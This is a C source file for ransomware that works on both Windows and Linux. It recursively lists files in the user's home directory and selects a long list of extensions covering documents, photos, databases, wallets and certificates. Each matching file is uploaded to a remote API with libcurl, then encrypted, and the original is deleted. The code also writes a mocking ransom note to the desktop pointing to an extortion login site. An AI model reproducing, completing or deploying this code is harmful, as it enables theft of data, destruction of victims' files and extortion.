#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <wchar.h>
#include <lmcons.h>
#endif

#include "files.h"


// Liste des extensions à chiffrer
const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".c", ".h", 
                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".md",
                            ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                            ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                            ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                            ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
                            ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                            ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                            ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
                            ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", 
                            ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", 
                            ".wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", 
                            ".rb", ".png", ".jpeg", ".jpg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", 
                            ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", 
                            ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", 
                            ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".cdr", ".indd", ".ai", 
                            ".eps", ".pdf", ".pdd", ".psd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", 
                            ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", 
                            ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"};

const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);

void sendFileToApi(const char *path, const char *id, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);

        // Add the file
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, path);

        // Add id
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id, CURL_ZERO_TERMINATED);

        // Add road of the api
        curl_easy_setopt(curl, CURLOPT_URL, api);

        // Attach everything
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Execute
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Clean to make a new upload
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

}

// Function to list files for both Linux and Windows
void listFiles(const char *path, PathList *pathList) {
    
#ifdef _WIN32
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char dirSpec[MAX_PATH];
    snprintf(dirSpec, sizeof(dirSpec), "%s\\*", path);

    hFind = FindFirstFile(dirSpec, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    } 

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                char subPath[MAX_PATH];
                snprintf(subPath, sizeof(subPath), "%s\\%s", path, findFileData.cFileName);
                listFiles(subPath, pathList);
            }
        } else {
            char filePath[MAX_PATH];
            snprintf(filePath, sizeof(filePath), "%s\\%s", path, findFileData.cFileName);
            addToPathList(pathList, filePath);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);

#else
    struct dirent *entry;
    DIR *dp = opendir(path);

    if (dp == NULL) {
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filePath[1024];
            snprintf(filePath, sizeof(filePath), "%s/%s", path, entry->d_name);
            addToPathList(pathList, filePath);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subPath[1024];
                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
                listFiles(subPath, pathList);
            }
        }
    }

    closedir(dp);
#endif
}

void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL) {
    char *path = get_user_path();
    PathList pathList;
    initPathList(&pathList);
    listFiles(path, &pathList);
    free(path);

    const char *ignoreDirs[] = {
        "Windows\\", "Program Files\\", "Programmes\\", "Programmes (x86)\\",
        "Program Files (x86)\\", "ProgramData\\", "$Recycle.Bin\\", "Corbeille\\", "AppData\\"
    };
    size_t num_ignoreDirs = sizeof(ignoreDirs) / sizeof(ignoreDirs[0]);

    for (size_t i = 0; i < pathList.count; ++i) {
        if (should_ignore_file(pathList.paths[i], ignoreDirs, num_ignoreDirs)) {
            continue;
        }

        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL) {
            for (size_t j = 0; j < num_extensions; ++j) {
                if (strcmp(extension, extensions[j]) == 0) {
                    handle_file(pathList.paths[i], id, URL, key, iv, aad);
                    break;
                }
            }
        }
    }
    freePathList(&pathList);
}

//Init PathList structure
void initPathList(PathList *pathList) {
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}

void addToPathList(PathList *pathList, const char *path) {
    if (pathList->count >= pathList->capacity) {
        //Increase list size
        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
    }

    pathList->paths[pathList->count] = strdup(path);
    pathList->count++;
}

void freePathList(PathList *pathList) {
    for (size_t i = 0; i < pathList->count; i++) {
        free(pathList->paths[i]);
    }
    free(pathList->paths);
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}

void write_to_file(char *filename, char *value, int size){
    FILE *file_pointer;
    file_pointer = fopen(filename, "w");

    if (file_pointer == NULL) {
        printf("Error: cannot open the file.\n");
    }

    fwrite(value, sizeof(char), size, file_pointer); 

    fclose(file_pointer);
}

void create_prank_file(const char *key) {
    char path[1024];
    char user[256];

    #ifdef _WIN32
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        strcat(path, "\\ransom.txt");
    } else {
        fprintf(stderr, "Failed to get desktop directory.\n");
        return;
    }
    #else
    char *homeDir = getenv("HOME");
    if (homeDir != NULL) {
        snprintf(path, sizeof(path), "%s/Desktop/ransom.txt", homeDir);
    } else {
        fprintf(stderr, "Unable to get HOME environment variable.\n");
        return;
    }
    #endif

    FILE *file = fopen(path, "w");
    if (file == NULL) {
        fprintf(stderr, "Failed to create file.\n");
        return;
    }

    fprintf(file, "We locked all your files, cuz of skills issues XDXDXDXDXDXD\nTo get your files back, follow this link and follow the instructions: http://willchabemyvalentine.love:42956/victim_login\nUse this to connect: %s\nGet rekd :3\nBest regards", key);
    fclose(file);

    printf("File created at: %s\n", path);
}

char* get_user_path() {
    const char *user;
    char *path;

    #ifdef _WIN32
    user = getenv("USERNAME");
    size_t size = snprintf(NULL, 0, "C:\\Users\\%s", user) + 1;
    path = (char *)malloc(size);
    snprintf(path, size, "C:\\Users\\%s", user);
    #else
    user = getenv("USER");
    size_t size = snprintf(NULL, 0, "/home/%s", user) + 1;
    path = (char *)malloc(size);
    snprintf(path, size, "/home/%s", user);
    printf("%s", path);
    #endif

    return path;
}

void handle_file(const char *path, const char *id, const char *URL, unsigned char *key, unsigned char *iv, unsigned char *aad) {
    sendFileToApi(path, id, URL);
    encrypt_file(key, iv, aad, path);
    
    if (remove(path) == 0) {
        printf("File deleted successfully: %s\n", path);
    } else {
        perror("Error deleting file");
    }
}

int should_ignore_file(const char *path, const char *ignoreDirs[], size_t num_ignoreDirs) {
    for (size_t j = 0; j < num_ignoreDirs; ++j) {
        if (strstr(path, ignoreDirs[j]) != NULL) {
            return 1;
        }
    }
    return 0;
}
